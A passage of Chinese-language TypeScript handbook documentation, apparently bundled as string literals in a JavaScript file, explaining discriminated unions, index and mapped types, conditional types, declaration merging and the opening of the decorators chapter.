`kind`属性称做_可辨识的特征_或_标签_。 其它的属性则特定于各个接口。 注意，目前各个接口间是没有联系的。 下面我们把它们联合到一起：\n\n```typescript\ntype Shape = Square | Rectangle | Circle;\n```\n\n现在我们使用可辨识联合:\n\n```typescript\nfunction area(s: Shape) {\n    switch (s.kind) {\n        case "square": return s.size * s.size;\n        case "rectangle": return s.height * s.width;\n        case "circle": return Math.PI * s.radius ** 2;\n    }\n}\n```\n\n### 完整性检查\n\n当没有涵盖所有可辨识联合的变化时，我们想让编译器可以通知我们。 比如，如果我们添加了`Triangle`到`Shape`，我们同时还需要更新`area`:\n\n```typescript\ntype Shape = Square | Rectangle | Circle | Triangle;\nfunction area(s: Shape) {\n    switch (s.kind) {\n        case "square": return s.size * s.size;\n        case "rectangle": return s.height * s.width;\n        case "circle": return Math.PI * s.radius ** 2;\n    }\n    // should error here - we didn\'t handle case "triangle"\n}\n```\n\n有两种方式可以实现。 首先是启用`--strictNullChecks`并且指定一个返回值类型：\n\n```typescript\nfunction area(s: Shape): number { // error: returns number | undefined\n    switch (s.kind) {\n        case "square": return s.size * s.size;\n        case "rectangle": return s.height * s.width;\n        case "circle": return Math.PI * s.radius ** 2;\n    }\n}\n```\n\n因为`switch`没有包含所有情况，所以TypeScript认为这个函数有时候会返回`undefined`。 如果你明确地指定了返回值类型为`number`，那么你会看到一个错误，因为实际上返回值的类型为`number | undefined`。 然而，这种方法存在些微妙之处且`--strictNullChecks`对旧代码支持不好。\n\n第二种方法使用`never`类型，编译器用它来进行完整性检查：\n\n```typescript\nfunction assertNever(x: never): never {\n    throw new Error("Unexpected object: " + x);\n}\nfunction area(s: Shape) {\n    switch (s.kind) {\n        case "square": return s.size * s.size;\n        case "rectangle": return s.height * s.width;\n        case "circle": return Math.PI * s.radius ** 2;\n        default: return assertNever(s); // error here if there are missing cases\n    }\n}\n```\n\n这里，`assertNever`检查`s`是否为`never`类型—即为除去所有可能情况后剩下的类型。 如果你忘记了某个case，那么`s`将具有一个真实的类型并且你会得到一个错误。 这种方式需要你定义一个额外的函数，但是在你忘记某个case的时候也更加明显。\n\n## 多态的`this`类型\n\n多态的`this`类型表示的是某个包含类或接口的_子类型_。 这被称做_F_-bounded多态性。 它能很容易的表现连贯接口间的继承，比如。 在计算器的例子里，在每个操作之后都返回`this`类型：\n\n```typescript\nclass BasicCalculator {\n    public constructor(protected value: number = 0) { }\n    public currentValue(): number {\n        return this.value;\n    }\n    public add(operand: number): this {\n        this.value += operand;\n        return this;\n    }\n    public multiply(operand: number): this {\n        this.value *= operand;\n        return this;\n    }\n    // ... other operations go here ...\n}\n\nlet v = new BasicCalculator(2)\n            .multiply(5)\n            .add(1)\n            .currentValue();\n```\n\n由于这个类使用了`this`类型，你可以继承它，新的类可以直接使用之前的方法，不需要做任何的改变。\n\n```typescript\nclass ScientificCalculator extends BasicCalculator {\n    public constructor(value = 0) {\n        super(value);\n    }\n    public sin() {\n        this.value = Math.sin(this.value);\n        return this;\n    }\n    // ... other operations go here ...\n}\n\nlet v = new ScientificCalculator(2)\n        .multiply(5)\n        .sin()\n        .add(1)\n        .currentValue();\n```\n\n如果没有`this`类型，`ScientificCalculator`就不能够在继承`BasicCalculator`的同时还保持接口的连贯性。 `multiply`将会返回`BasicCalculator`，它并没有`sin`方法。 然而，使用`this`类型，`multiply`会返回`this`，在这里就是`ScientificCalculator`。\n\n## 索引类型（Index types）\n\n使用索引类型，编译器就能够检查使用了动态属性名的代码。 例如，一个常见的JavaScript模式是从对象中选取属性的子集。\n\n```javascript\nfunction pluck(o, propertyNames) {\n    return propertyNames.map(n => o[n]);\n}\n```\n\n下面是如何在TypeScript里使用此函数，通过**索引类型查询**和**索引访问**操作符：\n\n```typescript\nfunction pluck<T, K extends keyof T>(o: T, propertyNames: K[]): T[K][] {\n  return propertyNames.map(n => o[n]);\n}\n\ninterface Car {\n    manufacturer: string;\n    model: string;\n    year: number;\n}\nlet taxi: Car = {\n    manufacturer: \'Toyota\',\n    model: \'Camry\',\n    year: 2014\n};\n\n// Manufacturer and model are both of type string,\n// so we can pluck them both into a typed string array\nlet makeAndModel: string[] = pluck(taxi, [\'manufacturer\', \'model\']);\n\n// If we try to pluck model and year, we get an\n// array of a union type: (string | number)[]\nlet modelYear = pluck(taxi, [\'model\', \'year\'])\n```\n\n编译器会检查`manufacturer`和`model`是否真的是`Car`上的一个属性。 本例还引入了几个新的类型操作符。 首先是`keyof T`，**索引类型查询操作符**。 对于任何类型`T`，`keyof T`的结果为`T`上已知的公共属性名的联合。 例如：\n\n```typescript\nlet carProps: keyof Car; // the union of (\'manufacturer\' | \'model\' | \'year\')\n```\n\n`keyof Car`是完全可以与`\'manufacturer\' | \'model\' | \'year\'`互相替换的。 不同的是如果你添加了其它的属性到`Car`，例如`ownersAddress: string`，那么`keyof Car`会自动变为`\'manufacturer\' | \'model\' | \'year\' | \'ownersAddress\'`。 你可以在像`pluck`函数这类上下文里使用`keyof`，因为在使用之前你并不清楚可能出现的属性名。 但编译器会检查你是否传入了正确的属性名给`pluck`：\n\n```typescript\n// error, \'unknown\' is not in \'manufacturer\' | \'model\' | \'year\'\npluck(taxi, [\'year\', \'unknown\']);\n```\n\n第二个操作符是`T[K]`，**索引访问操作符**。 在这里，类型语法反映了表达式语法。 这意味着`person[\'name\']`具有类型`Person[\'name\']` — 在我们的例子里则为`string`类型。 然而，就像索引类型查询一样，你可以在普通的上下文里使用`T[K]`，这正是它的强大所在。 你只要确保类型变量`K extends keyof T`就可以了。 例如下面`getProperty`函数的例子：\n\n```typescript\nfunction getProperty<T, K extends keyof T>(o: T, propertyName: K): T[K] {\n    return o[propertyName]; // o[propertyName] is of type T[K]\n}\n```\n\n`getProperty`里的`o: T`和`propertyName: K`，意味着`o[propertyName]: T[K]`。 当你返回`T[K]`的结果，编译器会实例化键的真实类型，因此`getProperty`的返回值类型会随着你需要的属性改变。\n\n```typescript\nlet name: string = getProperty(taxi, \'manufacturer\');\nlet year: number = getProperty(taxi, \'year\');\n\n// error, \'unknown\' is not in \'manufacturer\' | \'model\' | \'year\'\nlet unknown = getProperty(taxi, \'unknown\');\n```\n\n### 索引类型和字符串索引签名\n\n`keyof`和`T[K]`与字符串索引签名进行交互。索引签名的参数类型必须为`number`或`string`。 如果你有一个带有字符串索引签名的类型，那么`keyof T`会是`string | number`。 \\(并非只有`string`，因为在JavaScript里，你可以使用字符串`object[\'42\'`或 数字`object[42]`索引来访问对象属性\\)。 并且`T[string]`为索引签名的类型：\n\n```typescript\ninterface Dictionary<T> {\n    [key: string]: T;\n}\nlet keys: keyof Dictionary<number>; // string | number\nlet value: Dictionary<number>[\'foo\']; // number\n```\n\n如果一个类型带有数字索引签名，那么`keyof T`为`number`。\n\n```typescript\ninterface Dictionary<T> {\n    [key: number]: T;\n}\nlet keys: keyof Dictionary<number>; // number\nlet value: Dictionary<number>[\'foo\']; // Error, Property \'foo\' does not exist on type \'Dictionary<number>\'.\nlet value: Dictionary<number>[42]; // number\n```\n\n## 映射类型\n\n一个常见的任务是将一个已知的类型每个属性都变为可选的：\n\n```typescript\ninterface PersonPartial {\n    name?: string;\n    age?: number;\n}\n```\n\n或者我们想要一个只读版本：\n\n```typescript\ninterface PersonReadonly {\n    readonly name: string;\n    readonly age: number;\n}\n```\n\n这在JavaScript里经常出现，TypeScript提供了从旧类型中创建新类型的一种方式 — **映射类型**。 在映射类型里，新类型以相同的形式去转换旧类型里每个属性。 例如，你可以令每个属性成为`readonly`类型或可选的。 下面是一些例子：\n\n```typescript\ntype Readonly<T> = {\n    readonly [P in keyof T]: T[P];\n}\ntype Partial<T> = {\n    [P in keyof T]?: T[P];\n}\n```\n\n像下面这样使用：\n\n```typescript\ntype PersonPartial = Partial<Person>;\ntype ReadonlyPerson = Readonly<Person>;\n```\n\n需要注意的是这个语法描述的是类型而非成员。 若想添加成员，则可以使用交叉类型：\n\n```typescript\n// 这样使用\ntype PartialWithNewMember<T> = {\n  [P in keyof T]?: T[P];\n} & { newMember: boolean }\n// 不要这样使用\n// 这会报错！\ntype PartialWithNewMember<T> = {\n  [P in keyof T]?: T[P];\n  newMember: boolean;\n}\n```\n\n下面来看看最简单的映射类型和它的组成部分：\n\n```typescript\ntype Keys = \'option1\' | \'option2\';\ntype Flags = { [K in Keys]: boolean };\n```\n\n它的语法与索引签名的语法类型，内部使用了`for .. in`。 具有三个部分：\n\n1. 类型变量`K`，它会依次绑定到每个属性。\n2. 字符串字面量联合的`Keys`，它包含了要迭代的属性名的集合。\n3. 属性的结果类型。\n\n在个简单的例子里，`Keys`是硬编码的属性名列表并且属性类型永远是`boolean`，因此这个映射类型等同于：\n\n```typescript\ntype Flags = {\n    option1: boolean;\n    option2: boolean;\n}\n```\n\n在真正的应用里，可能不同于上面的`Readonly`或`Partial`。 它们会基于一些已存在的类型，且按照一定的方式转换字段。 这就是`keyof`和索引访问类型要做的事情：\n\n```typescript\ntype NullablePerson = { [P in keyof Person]: Person[P] | null }\ntype PartialPerson = { [P in keyof Person]?: Person[P] }\n```\n\n但它更有用的地方是可以有一些通用版本。\n\n```typescript\ntype Nullable<T> = { [P in keyof T]: T[P] | null }\ntype Partial<T> = { [P in keyof T]?: T[P] }\n```\n\n在这些例子里，属性列表是`keyof T`且结果类型是`T[P]`的变体。 这是使用通用映射类型的一个好模版。 因为这类转换是[同态](https://en.wikipedia.org/wiki/Homomorphism)的，映射只作用于`T`的属性而没有其它的。 编译器知道在添加任何新属性之前可以拷贝所有存在的属性修饰符。 例如，假设`Person.name`是只读的，那么`Partial<Person>.name`也将是只读的且为可选的。\n\n下面是另一个例子，`T[P]`被包装在`Proxy<T>`类里：\n\n```typescript\ntype Proxy<T> = {\n    get(): T;\n    set(value: T): void;\n}\ntype Proxify<T> = {\n    [P in keyof T]: Proxy<T[P]>;\n}\nfunction proxify<T>(o: T): Proxify<T> {\n   // ... wrap proxies ...\n}\nlet proxyProps = proxify(props);\n```\n\n注意`Readonly<T>`和`Partial<T>`用处不小，因此它们与`Pick`和`Record`一同被包含进了TypeScript的标准库里：\n\n```typescript\ntype Pick<T, K extends keyof T> = {\n    [P in K]: T[P];\n}\ntype Record<K extends keyof any, T> = {\n    [P in K]: T;\n}\n```\n\n`Readonly`，`Partial`和`Pick`是同态的，但`Record`不是。 因为`Record`并不需要输入类型来拷贝属性，所以它不属于同态：\n\n```typescript\ntype ThreeStringProps = Record<\'prop1\' | \'prop2\' | \'prop3\', string>\n```\n\n非同态类型本质上会创建新的属性，因此它们不会从它处拷贝属性修饰符。\n\n### 由映射类型进行推断\n\n现在你了解了如何包装一个类型的属性，那么接下来就是如何拆包。 其实这也非常容易：\n\n```typescript\nfunction unproxify<T>(t: Proxify<T>): T {\n    let result = {} as T;\n    for (const k in t) {\n        result[k] = t[k].get();\n    }\n    return result;\n}\n\nlet originalProps = unproxify(proxyProps);\n```\n\n注意这个拆包推断只适用于同态的映射类型。 如果映射类型不是同态的，那么需要给拆包函数一个明确的类型参数。\n\n### 有条件类型\n\nTypeScript 2.8引入了_有条件类型_，它能够表示非统一的类型。 有条件的类型会以一个条件表达式进行类型关系检测，从而在两种类型中选择其一：\n\n```typescript\nT extends U ? X : Y\n```\n\n上面的类型意思是，若`T`能够赋值给`U`，那么类型是`X`，否则为`Y`。\n\n有条件的类型`T extends U ? X : Y`或者_解析_为`X`，或者_解析_为`Y`，再或者_延迟_解析，因为它可能依赖一个或多个类型变量。 若`T`或`U`包含类型参数，那么是否解析为`X`或`Y`或推迟，取决于类型系统是否有足够的信息来确定`T`总是可以赋值给`U`。\n\n下面是一些类型可以被立即解析的例子：\n\n```typescript\ndeclare function f<T extends boolean>(x: T): T extends true ? string : number;\n\n// Type is \'string | number\nlet x = f(Math.random() < 0.5)\n```\n\n另外一个例子涉及`TypeName`类型别名，它使用了嵌套了有条件类型：\n\n```typescript\ntype TypeName<T> =\n    T extends string ? "string" :\n    T extends number ? "number" :\n    T extends boolean ? "boolean" :\n    T extends undefined ? "undefined" :\n    T extends Function ? "function" :\n    "object";\n\ntype T0 = TypeName<string>;  // "string"\ntype T1 = TypeName<"a">;  // "string"\ntype T2 = TypeName<true>;  // "boolean"\ntype T3 = TypeName<() => void>;  // "function"\ntype T4 = TypeName<string[]>;  // "object"\n```\n\n下面是一个有条件类型被推迟解析的例子:\n\n```typescript\ninterface Foo {\n    propA: boolean;\n    propB: boolean;\n}\n\ndeclare function f<T>(x: T): T extends Foo ? string : number;\n\nfunction foo<U>(x: U) {\n    // Has type \'U extends Foo ? string : number\'\n    let a = f(x);\n\n    // This assignment is allowed though!\n    let b: string | number = a;\n}\n```\n\n这里，`a`变量含有未确定的有条件类型。 当有另一段代码调用`foo`，它会用其它类型替换`U`，TypeScript将重新计算有条件类型，决定它是否可以选择一个分支。\n\n与此同时，我们可以将有条件类型赋值给其它类型，只要有条件类型的每个分支都可以赋值给目标类型。 因此在我们的例子里，我们可以将`U extends Foo ? string : number`赋值给`string | number`，因为不管这个有条件类型最终结果是什么，它只能是`string`或`number`。\n\n#### 分布式有条件类型\n\n如果有条件类型里待检查的类型是`naked type parameter`，那么它也被称为“分布式有条件类型”。 分布式有条件类型在实例化时会自动分发成联合类型。 例如，实例化`T extends U ? X : Y`，`T`的类型为`A | B | C`，会被解析为`(A extends U ? X : Y) | (B extends U ? X : Y) | (C extends U ? X : Y)`。\n\n**例子**\n\n```typescript\ntype T10 = TypeName<string | (() => void)>;  // "string" | "function"\ntype T12 = TypeName<string | string[] | undefined>;  // "string" | "object" | "undefined"\ntype T11 = TypeName<string[] | number[]>;  // "object"\n```\n\n在`T extends U ? X : Y`的实例化里，对`T`的引用被解析为联合类型的一部分（比如，`T`指向某一单个部分，在有条件类型分布到联合类型之后）。 此外，在`X`内对`T`的引用有一个附加的类型参数约束`U`（例如，`T`被当成在`X`内可赋值给`U`）。\n\n**例子**\n\n```typescript\ntype BoxedValue<T> = { value: T };\ntype BoxedArray<T> = { array: T[] };\ntype Boxed<T> = T extends any[] ? BoxedArray<T[number]> : BoxedValue<T>;\n\ntype T20 = Boxed<string>;  // BoxedValue<string>;\ntype T21 = Boxed<number[]>;  // BoxedArray<number>;\ntype T22 = Boxed<string | number[]>;  // BoxedValue<string> | BoxedArray<number>;\n```\n\n注意在`Boxed<T>`的`true`分支里，`T`有个额外的约束`any[]`，因此它适用于`T[number]`数组元素类型。同时也注意一下有条件类型是如何分布成联合类型的。\n\n有条件类型的分布式的属性可以方便地用来_过滤_联合类型：\n\n```typescript\ntype Diff<T, U> = T extends U ? never : T;  // Remove types from T that are assignable to U\ntype Filter<T, U> = T extends U ? T : never;  // Remove types from T that are not assignable to U\n\ntype T30 = Diff<"a" | "b" | "c" | "d", "a" | "c" | "f">;  // "b" | "d"\ntype T31 = Filter<"a" | "b" | "c" | "d", "a" | "c" | "f">;  // "a" | "c"\ntype T32 = Diff<string | number | (() => void), Function>;  // string | number\ntype T33 = Filter<string | number | (() => void), Function>;  // () => void\n\ntype NonNullable<T> = Diff<T, null | undefined>;  // Remove null and undefined from T\n\ntype T34 = NonNullable<string | number | undefined>;  // string | number\ntype T35 = NonNullable<string | string[] | null | undefined>;  // string | string[]\n\nfunction f1<T>(x: T, y: NonNullable<T>) {\n    x = y;  // Ok\n    y = x;  // Error\n}\n\nfunction f2<T extends string | undefined>(x: T, y: NonNullable<T>) {\n    x = y;  // Ok\n    y = x;  // Error\n    let s1: string = x;  // Error\n    let s2: string = y;  // Ok\n}\n```\n\n有条件类型与映射类型结合时特别有用：\n\n```typescript\ntype FunctionPropertyNames<T> = { [K in keyof T]: T[K] extends Function ? K : never }[keyof T];\ntype FunctionProperties<T> = Pick<T, FunctionPropertyNames<T>>;\n\ntype NonFunctionPropertyNames<T> = { [K in keyof T]: T[K] extends Function ? never : K }[keyof T];\ntype NonFunctionProperties<T> = Pick<T, NonFunctionPropertyNames<T>>;\n\ninterface Part {\n    id: number;\n    name: string;\n    subparts: Part[];\n    updatePart(newName: string): void;\n}\n\ntype T40 = FunctionPropertyNames<Part>;  // "updatePart"\ntype T41 = NonFunctionPropertyNames<Part>;  // "id" | "name" | "subparts"\ntype T42 = FunctionProperties<Part>;  // { updatePart(newName: string): void }\ntype T43 = NonFunctionProperties<Part>;  // { id: number, name: string, subparts: Part[] }\n```\n\n与联合类型和交叉类型相似，有条件类型不允许递归地引用自己。比如下面的错误。\n\n**例子**\n\n```typescript\ntype ElementType<T> = T extends any[] ? ElementType<T[number]> : T;  // Error\n```\n\n#### 有条件类型中的类型推断\n\n现在在有条件类型的`extends`子语句中，允许出现`infer`声明，它会引入一个待推断的类型变量。 这个推断的类型变量可以在有条件类型的true分支中被引用。 允许出现多个同类型变量的`infer`。\n\n例如，下面代码会提取函数类型的返回值类型：\n\n```typescript\ntype ReturnType<T> = T extends (...args: any[]) => infer R ? R : any;\n```\n\n有条件类型可以嵌套来构成一系列的匹配模式，按顺序进行求值：\n\n```typescript\ntype Unpacked<T> =\n    T extends (infer U)[] ? U :\n    T extends (...args: any[]) => infer U ? U :\n    T extends Promise<infer U> ? U :\n    T;\n\ntype T0 = Unpacked<string>;  // string\ntype T1 = Unpacked<string[]>;  // string\ntype T2 = Unpacked<() => string>;  // string\ntype T3 = Unpacked<Promise<string>>;  // string\ntype T4 = Unpacked<Promise<string>[]>;  // Promise<string>\ntype T5 = Unpacked<Unpacked<Promise<string>[]>>;  // string\n```\n\n下面的例子解释了在协变位置上，同一个类型变量的多个候选类型会被推断为联合类型：\n\n```typescript\ntype Foo<T> = T extends { a: infer U, b: infer U } ? U : never;\ntype T10 = Foo<{ a: string, b: string }>;  // string\ntype T11 = Foo<{ a: string, b: number }>;  // string | number\n```\n\n相似地，在抗变位置上，同一个类型变量的多个候选类型会被推断为交叉类型：\n\n```typescript\ntype Bar<T> = T extends { a: (x: infer U) => void, b: (x: infer U) => void } ? U : never;\ntype T20 = Bar<{ a: (x: string) => void, b: (x: string) => void }>;  // string\ntype T21 = Bar<{ a: (x: string) => void, b: (x: number) => void }>;  // string & number\n```\n\n当推断具有多个调用签名（例如函数重载类型）的类型时，用_最后_的签名（大概是最自由的包含所有情况的签名）进行推断。 无法根据参数类型列表来解析重载。\n\n```typescript\ndeclare function foo(x: string): number;\ndeclare function foo(x: number): string;\ndeclare function foo(x: string | number): string | number;\ntype T30 = ReturnType<typeof foo>;  // string | number\n```\n\n无法在正常类型参数的约束子语句中使用`infer`声明：\n\n```typescript\ntype ReturnType<T extends (...args: any[]) => infer R> = R;  // 错误，不支持\n```\n\n但是，可以这样达到同样的效果，在约束里删掉类型变量，用有条件类型替换：\n\n```typescript\ntype AnyFunction = (...args: any[]) => any;\ntype ReturnType<T extends AnyFunction> = T extends (...args: any[]) => infer R ? R : any;\n```\n\n#### 预定义的有条件类型\n\nTypeScript 2.8在`lib.d.ts`里增加了一些预定义的有条件类型：\n\n* `Exclude<T, U>` -- 从`T`中剔除可以赋值给`U`的类型。\n* `Extract<T, U>` -- 提取`T`中可以赋值给`U`的类型。\n* `NonNullable<T>` -- 从`T`中剔除`null`和`undefined`。\n* `ReturnType<T>` -- 获取函数返回值类型。\n* `InstanceType<T>` -- 获取构造函数类型的实例类型。\n\n**Example**\n\n```typescript\ntype T00 = Exclude<"a" | "b" | "c" | "d", "a" | "c" | "f">;  // "b" | "d"\ntype T01 = Extract<"a" | "b" | "c" | "d", "a" | "c" | "f">;  // "a" | "c"\n\ntype T02 = Exclude<string | number | (() => void), Function>;  // string | number\ntype T03 = Extract<string | number | (() => void), Function>;  // () => void\n\ntype T04 = NonNullable<string | number | undefined>;  // string | number\ntype T05 = NonNullable<(() => string) | string[] | null | undefined>;  // (() => string) | string[]\n\nfunction f1(s: string) {\n    return { a: 1, b: s };\n}\n\nclass C {\n    x = 0;\n    y = 0;\n}\n\ntype T10 = ReturnType<() => string>;  // string\ntype T11 = ReturnType<(s: string) => void>;  // void\ntype T12 = ReturnType<(<T>() => T)>;  // {}\ntype T13 = ReturnType<(<T extends U, U extends number[]>() => T)>;  // number[]\ntype T14 = ReturnType<typeof f1>;  // { a: number, b: string }\ntype T15 = ReturnType<any>;  // any\ntype T16 = ReturnType<never>;  // never\ntype T17 = ReturnType<string>;  // Error\ntype T18 = ReturnType<Function>;  // Error\n\ntype T20 = InstanceType<typeof C>;  // C\ntype T21 = InstanceType<any>;  // any\ntype T22 = InstanceType<never>;  // never\ntype T23 = InstanceType<string>;  // Error\ntype T24 = InstanceType<Function>;  // Error\n```\n\n> 注意：`Exclude`类型是[建议的](https://github.com/Microsoft/TypeScript/issues/12215#issuecomment-307871458)`Diff`类型的一种实现。我们使用`Exclude`这个名字是为了避免破坏已经定义了`Diff`的代码，并且我们感觉这个名字能更好地表达类型的语义。\n\n',yl='# 声明合并\n\n## 介绍\n\nTypeScript中有些独特的概念可以在类型层面上描述JavaScript对象的模型。 这其中尤其独特的一个例子是“声明合并”的概念。 理解了这个概念，将有助于操作现有的JavaScript代码。 同时，也会有助于理解更多高级抽象的概念。\n\n对本文件来讲，“声明合并”是指编译器将针对同一个名字的两个独立声明合并为单一声明。 合并后的声明同时拥有原先两个声明的特性。 任何数量的声明都可被合并；不局限于两个声明。\n\n## 基础概念\n\nTypeScript中的声明会创建以下三种实体之一：命名空间，类型或值。 创建命名空间的声明会新建一个命名空间，它包含了用（.）符号来访问时使用的名字。 创建类型的声明是：用声明的模型创建一个类型并绑定到给定的名字上。 最后，创建值的声明会创建在JavaScript输出中看到的值。\n\n| Declaration Type | Namespace | Type | Value |\n| :--- | :---: | :---: | :---: |\n| Namespace | X |  | X |\n| Class |  | X | X |\n| Enum |  | X | X |\n| Interface |  | X |  |\n| Type Alias |  | X |  |\n| Function |  |  | X |\n| Variable |  |  | X |\n\n理解每个声明创建了什么，有助于理解当声明合并时有哪些东西被合并了。\n\n## 合并接口\n\n最简单也最常见的声明合并类型是接口合并。 从根本上说，合并的机制是把双方的成员放到一个同名的接口里。\n\n```typescript\ninterface Box {\n    height: number;\n    width: number;\n}\n\ninterface Box {\n    scale: number;\n}\n\nlet box: Box = {height: 5, width: 6, scale: 10};\n```\n\n接口的非函数的成员应该是唯一的。 如果它们不是唯一的，那么它们必须是相同的类型。 如果两个接口中同时声明了同名的非函数成员且它们的类型不同，则编译器会报错。\n\n对于函数成员，每个同名函数声明都会被当成这个函数的一个重载。 同时需要注意，当接口`A`与后来的接口`A`合并时，后面的接口具有更高的优先级。\n\n如下例所示：\n\n```typescript\ninterface Cloner {\n    clone(animal: Animal): Animal;\n}\n\ninterface Cloner {\n    clone(animal: Sheep): Sheep;\n}\n\ninterface Cloner {\n    clone(animal: Dog): Dog;\n    clone(animal: Cat): Cat;\n}\n```\n\n这三个接口合并成一个声明：\n\n```typescript\ninterface Cloner {\n    clone(animal: Dog): Dog;\n    clone(animal: Cat): Cat;\n    clone(animal: Sheep): Sheep;\n    clone(animal: Animal): Animal;\n}\n```\n\n注意每组接口里的声明顺序保持不变，但各组接口之间的顺序是后来的接口重载出现在靠前位置。\n\n这个规则有一个例外是当出现特殊的函数签名时。 如果签名里有一个参数的类型是_单一_的字符串字面量（比如，不是字符串字面量的联合类型），那么它将会被提升到重载列表的最顶端。\n\n比如，下面的接口会合并到一起：\n\n```typescript\ninterface Document {\n    createElement(tagName: any): Element;\n}\ninterface Document {\n    createElement(tagName: "div"): HTMLDivElement;\n    createElement(tagName: "span"): HTMLSpanElement;\n}\ninterface Document {\n    createElement(tagName: string): HTMLElement;\n    createElement(tagName: "canvas"): HTMLCanvasElement;\n}\n```\n\n合并后的`Document`将会像下面这样：\n\n```typescript\ninterface Document {\n    createElement(tagName: "canvas"): HTMLCanvasElement;\n    createElement(tagName: "div"): HTMLDivElement;\n    createElement(tagName: "span"): HTMLSpanElement;\n    createElement(tagName: string): HTMLElement;\n    createElement(tagName: any): Element;\n}\n```\n\n## 合并命名空间\n\n与接口相似，同名的命名空间也会合并其成员。 命名空间会创建出命名空间和值，我们需要知道这两者都是怎么合并的。\n\n对于命名空间的合并，模块导出的同名接口进行合并，构成单一命名空间内含合并后的接口。\n\n对于命名空间里值的合并，如果当前已经存在给定名字的命名空间，那么后来的命名空间的导出成员会被加到已经存在的那个模块里。\n\n`Animals`声明合并示例：\n\n```typescript\nnamespace Animals {\n    export class Zebra { }\n}\n\nnamespace Animals {\n    export interface Legged { numberOfLegs: number; }\n    export class Dog { }\n}\n```\n\n等同于：\n\n```typescript\nnamespace Animals {\n    export interface Legged { numberOfLegs: number; }\n\n    export class Zebra { }\n    export class Dog { }\n}\n```\n\n除了这些合并外，你还需要了解非导出成员是如何处理的。 非导出成员仅在其原有的（合并前的）命名空间内可见。这就是说合并之后，从其它命名空间合并进来的成员无法访问非导出成员。\n\n下例提供了更清晰的说明：\n\n```typescript\nnamespace Animal {\n    let haveMuscles = true;\n\n    export function animalsHaveMuscles() {\n        return haveMuscles;\n    }\n}\n\nnamespace Animal {\n    export function doAnimalsHaveMuscles() {\n        return haveMuscles;  // Error, because haveMuscles is not accessible here\n    }\n}\n```\n\n因为`haveMuscles`并没有导出，只有`animalsHaveMuscles`函数共享了原始未合并的命名空间可以访问这个变量。 `doAnimalsHaveMuscles`函数虽是合并命名空间的一部分，但是访问不了未导出的成员。\n\n## 命名空间与类和函数和枚举类型合并\n\n命名空间可以与其它类型的声明进行合并。 只要命名空间的定义符合将要合并类型的定义。合并结果包含两者的声明类型。 TypeScript使用这个功能去实现一些JavaScript里的设计模式。\n\n### 合并命名空间和类\n\n这让我们可以表示内部类。\n\n```typescript\nclass Album {\n    label: Album.AlbumLabel;\n}\nnamespace Album {\n    export class AlbumLabel { }\n}\n```\n\n合并规则与上面`合并命名空间`小节里讲的规则一致，我们必须导出`AlbumLabel`类，好让合并的类能访问。 合并结果是一个类并带有一个内部类。 你也可以使用命名空间为类增加一些静态属性。\n\n除了内部类的模式，你在JavaScript里，创建一个函数稍后扩展它增加一些属性也是很常见的。 TypeScript使用声明合并来达到这个目的并保证类型安全。\n\n```typescript\nfunction buildLabel(name: string): string {\n    return buildLabel.prefix + name + buildLabel.suffix;\n}\n\nnamespace buildLabel {\n    export let suffix = "";\n    export let prefix = "Hello, ";\n}\n\nconsole.log(buildLabel("Sam Smith"));\n```\n\n相似的，命名空间可以用来扩展枚举型：\n\n```typescript\nenum Color {\n    red = 1,\n    green = 2,\n    blue = 4\n}\n\nnamespace Color {\n    export function mixColor(colorName: string) {\n        if (colorName == "yellow") {\n            return Color.red + Color.green;\n        }\n        else if (colorName == "white") {\n            return Color.red + Color.green + Color.blue;\n        }\n        else if (colorName == "magenta") {\n            return Color.red + Color.blue;\n        }\n        else if (colorName == "cyan") {\n            return Color.green + Color.blue;\n        }\n    }\n}\n```\n\n## 非法的合并\n\nTypeScript并非允许所有的合并。 目前，类不能与其它类或变量合并。 想要了解如何模仿类的合并，请参考[TypeScript的混入](mixins.md)。\n\n## 模块扩展\n\n虽然JavaScript不支持合并，但你可以为导入的对象打补丁以更新它们。让我们考察一下这个玩具性的示例：\n\n```typescript\n// observable.ts\nexport class Observable<T> {\n    // ... implementation left as an exercise for the reader ...\n}\n\n// map.ts\nimport { Observable } from "./observable";\nObservable.prototype.map = function (f) {\n    // ... another exercise for the reader\n}\n```\n\n它也可以很好地工作在TypeScript中， 但编译器对 `Observable.prototype.map`一无所知。 你可以使用扩展模块来将它告诉编译器：\n\n```typescript\n// observable.ts\nexport class Observable<T> {\n    // ... implementation left as an exercise for the reader ...\n}\n\n// map.ts\nimport { Observable } from "./observable";\ndeclare module "./observable" {\n    interface Observable<T> {\n        map<U>(f: (x: T) => U): Observable<U>;\n    }\n}\nObservable.prototype.map = function (f) {\n    // ... another exercise for the reader\n}\n\n\n// consumer.ts\nimport { Observable } from "./observable";\nimport "./map";\nlet o: Observable<number>;\no.map(x => x.toFixed());\n```\n\n模块名的解析和用`import`/`export`解析模块标识符的方式是一致的。 更多信息请参考 [Modules](modules.md)。 当这些声明在扩展中合并时，就如同在原始位置被声明一样。 但是，有两点限制需要注意：\n\n1. 你不能在扩展中声明新的顶级声明－仅可以扩展模块中已经存在的声明。\n2. 默认导出也不能扩展，只有命名的导出才可以（因为你需要使用导出的名字来进行扩展，并且`default`是保留关键字 - 详情查看[\\#14080](https://github.com/Microsoft/TypeScript/issues/14080)）\n\n### 全局扩展\n\n你也以在模块内部添加声明到全局作用域中。\n\n```typescript\n// observable.ts\nexport class Observable<T> {\n    // ... still no implementation ...\n}\n\ndeclare global {\n    interface Array<T> {\n        toObservable(): Observable<T>;\n    }\n}\n\nArray.prototype.toObservable = function () {\n    // ...\n}\n```\n\n全局扩展与模块扩展的行为和限制是相同的。\n\n',fl='# Decorators\n\n## 介绍\n\n随着TypeScript和ES6里引入了类，在一些场景下我们需要额外的特性来支持标注或修改类及其成员。 装饰器（Decorators）为我们在类的声明及成员上通过元编程语法添加标注提供了一种方式。 Javascript里的装饰器目前处在[建议征集的第二阶段](https://github.com/tc39/proposal-decorators)，但在TypeScript里已做为一项实验性特性予以支持。\n\n> 注意  装饰器是一项实验性特性，在未来的版本中可能会发生改变。\n\n若要启用实验性的装饰器特性，你必须在命令行或`tsconfig.json`里启用`experimentalDecorators`编译器选项：\n\n**命令行**:\n\n```text\ntsc --target ES5 --experimentalDecorators\n```\n\n**tsconfig.json**:\n\n```javascript\n{\n    "compilerOptions": {\n        "target": "ES5",\n        "experimentalDecorators": true\n    }\n}\n```\n\n## 装饰器\n\n_装饰器_是一种特殊类型的声明，它能够被附加到[类声明](decorators.md#class-decorators)，[方法](decorators.md#method-decorators)，[访问符](decorators.md#accessor-decorators)，[属性](decorators.md#property-decorators)或[参数](decorators.md#parameter-decorators)上。 